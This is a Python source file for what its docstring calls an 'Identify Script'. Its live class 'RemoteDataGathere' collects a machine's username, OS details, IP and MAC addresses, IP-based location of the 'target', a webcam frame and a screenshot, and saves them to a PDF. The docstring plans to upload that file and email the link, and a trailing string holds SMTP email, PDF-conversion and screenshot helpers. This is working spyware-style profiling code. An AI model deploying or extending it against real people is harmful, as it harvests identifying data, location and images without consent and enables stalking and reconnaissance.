"""
Identify Script:
Save timestamp.         *   *
Save OS.                *   *
Save Username           *   *
Save Architecture.      *   *
Save Screen Size.       *   *
Save IP.                *   *
Save MAC.               *   *
Save SSID.              *   
Save NIC's              *   *
Get current location.   *   *
Activate webcam.        *   *
Take screenshot.        *   *
Save all data to a pdf. *
Upload pdf to online service.
Send link to email
"""

# import os
# import cv2
# import PIL
# import socket
# import datetime
# import platform
# import pyautogui
# import PyPDF2
# import pdf2image
# from fpdf import FPDF
# from PyPDF2 import pdfFileWriter, PdfFileReader
# from pdf2image import convert_from_path

import os
import re
import cv2
import uuid
import platform
import psutil
import getpass
import socket
import PyPDF2
import geocoder
import pyautogui
import numpy as np
import reverse_geocoder as rg
from fpdf import FPDF
from datetime import datetime
from PyPDF2 import PdfFileWriter, PdfFileReader


class RemoteDataGathere(object):
    def __init__(self):
        self.save_path = os.path.join(os.path.expanduser("~"), "Desktop")
        self.os_data = platform.uname()
        self.boot_ts = datetime.fromtimestamp(psutil.boot_time())
        self.curr_ts = datetime.now()
        self.location = [*geocoder.ip("me").latlng]
        self.pdf_writer = FPDF()
        self.data = {}

    def print_data(self):
        for key, value in self.data.items():
            print(f"{key}: {value}")
    

    def system_info(self):
        self.data["Operating System"] = self.os_data.system
        self.data["Operating System Release"] = self.os_data.release
        self.data["Operating System Version"] = self.os_data.version
        self.data["Operating System Arch"] = self.os_data.machine
        self.data["Processor"] = self.os_data.processor
        self.data["Host Name"] = self.os_data.node
        self.data["Username"] = getpass.getuser()
        self.data["Boot Time"] = str(f"{self.boot_ts.day}/{self.boot_ts.month}/{self.boot_ts.year} {self.boot_ts.hour}:{self.boot_ts.minute}:{self.boot_ts.second}")
        self.data["Current Time"] = str(self.curr_ts.strftime("%d-%m-%Y %H:%M:%S"))
        self.data["Network Interfaces"] = str([*psutil.net_if_addrs().keys()][0:3])
        self.data["IP Address"] = socket.gethostbyname(socket.gethostname())
        self.data["Mac Address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def target_location(self):
        latitude, longitude = self.location
        city = rg.search((latitude, longitude), verbose=False)
        self.data["Location"] = city[0]["name"]
    
    def headshot(self):
        
        while True:
            try:            
                camera = cv2.VideoCapture(0)
                val, frame = camera.read()
                cv2.imshow("Smile!", frame)
            except:
                pass
            finally:
                shot = pyautogui.screenshot()
                shot.save(f"{self.save_path}\\python_screenshot.png")
                img = cv2.imread(f"{self.save_path}\\python_screenshot.png")
                height, width, _ = img.shape
                self.data["Screen Size"] = str(f"{width}x{height} px")
                camera.release()
                cv2.destroyAllWindows()
                break
    
    def pdf_assemble(self):
        line = 0
        self.pdf_writer.add_page()
        self.pdf_writer.set_font("Arial", size=15)
        for key, value in self.data.items():
            key = key.encode('latin-1', 'replace').decode('latin-1')
            value = value.encode('latin-1', 'replace').decode('latin-1')
            self.pdf_writer.cell(200, 10, txt=f"{key}: {value}", ln=line, align="c")
            line += 1
        
        return self.pdf_writer.output(os.path.join(self.save_path, "Datafile.pdf"))



if __name__ == "__main__":
    snap = RemoteDataGathere()
    snap.system_info()
    snap.target_location()
    snap.headshot()
    snap.pdf_assemble()
    


 

r"""

Email Sender:

import smtplib, ssl, getpass

class Email(object):
    def __init__(self):
        self.port = 465  # SSL port
        self.smtp_server = "smtp.gmail.com" # smtp server address
        creds = self.login_credentials()    # Sender credentials
        self.sender_email = creds["email"]  # Senders email
        self.password = creds["pass"]       # Senders password
        # Create a secure SSL context
        self.context = ssl.create_default_context()
    

    def login_credentials(self):
        sender_email = str(input(r"Enter your email here: "))
        password = getpass.getpass("Enter your password here: ")
        return {"email":sender_email, "pass":password}

    def message(self):
        subject = str(input(r"Subject: "))
        message = str(input(r"Message: "))
        return str(f"Subject: {subject}\n"
                   f"{message}")

    def send_mail(self):
        receiver_email = str(input(r"Enter receivers email here: ")) # Receivers email
        message = self.message()
        try:
            with smtplib.SMTP_SSL(self.smtp_server, self.port, context=self.context) as server:
                server.login(self.sender_email, self.password)
                server.sendmail(self.sender_email, receiver_email, message)
                print("\nEmail successfully sent!")
        except:
            print("\nError occurred while trying to send the email.. Please try again.")


if __name__ == "__main__":
    Email().send_mail()

____________________________________________________________________________________________________

Text to pdf:

import PyPDF2
from fpdf import FPDF
from PyPDF2 import PdfFileWriter, PdfFileReader

class Text_Pdf(object):
    def __init__(self, file_path):
        self.file_path = file_path
        self.file_name = self.file_path.split("\\")[-1]
        self.file_ext = self.file_name.split(".")[-1]
        self.main()
    
    def __repr__(self):
        return f"{self.file_name} Converted..."

    def main(self):
        if self.file_ext == "pdf":
            pdf = PyPDF2.PdfFileReader(open(self.file_path, "rb"))
            with open(f"{self.file_name.strip('.pdf')}.txt", "a") as file:
                for page in pdf.pages:
                    file.write(page.extractText())
        else:
            parser = FPDF()
            parser.add_page()
            parser.set_font("Arial", size=15)
            with open(self.file_path, "r") as file:
                for row, line in enumerate(file):
                    line = line.encode('latin-1', 'replace').decode('latin-1')
                    parser.cell(200, 10, txt=line, ln=row, align="c")
            return parser.output(f"{self.file_name.strip('.txt')}.pdf")

if __name__ == "__main__":
    file = input("Drag and Drop file here:\n >> ")
    pdf_tool = Text_Pdf(file)
    print(pdf_tool)

__________________________________________________________________________________________________

Pic to pdf:

import os
import pdf2image
from PIL import Image 
from pdf2image import convert_from_path


class Pic_Pdf(object):
    def __init__(self, file_path):
        self.file_path = file_path.split("\\")
        self.file_name = self.file_path[-1]
        self.file_ext = self.file_name.split(".")[-1]
        self.file_path = os.path.join(*self.file_path)
        self.main()
    
    def __repr__(self):
        return f"{self.file_name} Converted..."

    def main(self):
        if self.file_ext == "pdf":
            pages = convert_from_path(self.file_path, 500)
            for page in pages:
                page.save(self.file_path.replace(".pdf", ".png"), "PNG")
            
        else:
            picture = Image.open(self.file_path)
            parsed = picture.convert("RGB")
            return parsed.save(self.file_path.replace(f".{self.file_ext}", ".pdf"))


if __name__ == "__main__":
    print("\nDrag and Drop file here:")
    file = input(r"  >> ")
    pdf_tool = Pic_Pdf(file)
    print(pdf_tool)

__________________________________________________________________________________________________

Screenshot:

  
import os
import pyautogui

def screenshot():
    # Save screenshot to picture folder
    save_path = os.path.join(os.path.expanduser("~"), "Pictures")
    shot = pyautogui.screenshot()
    shot.save(f"{save_path}\\python_screenshot.png")
    return print(f"\nScreenshot taken, and saved to {save_path}")

if __name__ == "__main__":
    screenshot()

"""